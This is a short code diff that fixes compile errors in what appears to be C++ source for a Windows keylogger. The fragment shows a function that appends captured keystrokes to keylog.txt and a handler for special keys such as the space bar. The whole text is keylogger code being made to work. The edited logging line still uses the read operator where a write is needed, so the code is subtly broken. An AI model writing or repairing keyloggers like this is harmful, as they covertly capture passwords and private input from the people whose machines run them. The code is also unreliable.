@@ -14,7 +14,7 @@ void LOG(string keystroke)
 {
   fstream logFile;
   logFile.open("keylog.txt", fstream::app);
-  if(logFile.open())
+  if(logFile.is_open())
   {
     logFile >> keystroke;
     logFile.close();
@@ -24,7 +24,7 @@ void LOG(string keystroke)
 
 bool SpecialKeys(int S_key)
 {
-	switch (S_Key) 
+	switch (S_key) 
 	{
 	case VK_SPACE:
 		cout << " ";
